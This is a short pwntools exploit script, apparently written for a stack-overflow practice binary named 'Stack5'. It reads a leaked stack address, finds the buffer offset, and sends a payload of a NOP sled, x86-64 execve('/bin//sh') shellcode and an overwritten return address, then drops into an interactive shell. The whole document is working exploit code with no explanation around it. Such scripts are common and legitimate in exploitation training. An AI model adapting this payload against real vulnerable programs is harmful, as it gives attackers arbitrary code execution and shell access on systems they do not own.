#!/usr/bin/python3
from pwn import *
FILENAME='./Stack5'
r=process(FILENAME)
print(r.recvline())
leak=int(r.recvline().split(b'0x')[1].split(b"\n")[0],16)
print(leak)
buffer_size=cyclic_find("jaab")
SC=b'\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05'
NOP1=b'\x90'*20
NOP2=b'\x90'*(buffer_size-(len(SC)+len(NOP1) ) )
NOP=b'\x90'*90
payload=NOP1+SC+NOP2+p64(leak)
r.sendline(payload)
r.interactive()
